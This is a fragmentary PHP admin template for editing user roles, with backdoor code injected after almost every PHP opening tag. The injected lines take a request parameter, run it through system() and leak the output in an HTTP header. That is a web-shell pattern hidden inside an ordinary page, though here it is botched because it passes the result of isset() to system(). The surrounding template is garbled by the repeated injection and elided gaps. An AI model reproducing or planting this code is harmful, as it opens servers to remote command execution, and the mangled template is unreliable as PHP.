...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.edit_role') ?></h3>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($role): ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('role_updated')): Session::deleteFlash(); ?>
				<div class="alert alert-success alert-dismissible">
					<span class="close" data-dismiss="alert">&times;</span>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.role_updated') ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>	
			...
			<form action="?page=user-role-edit&id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $role->id ?>" method="POST">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $role->name ?>" class="form-control">
			    </div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $role->permissions ?></textarea>
			    </div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.update_role') ?></button>
			    </div>
			</form>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('errors.roleid') ?></div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif; ?>
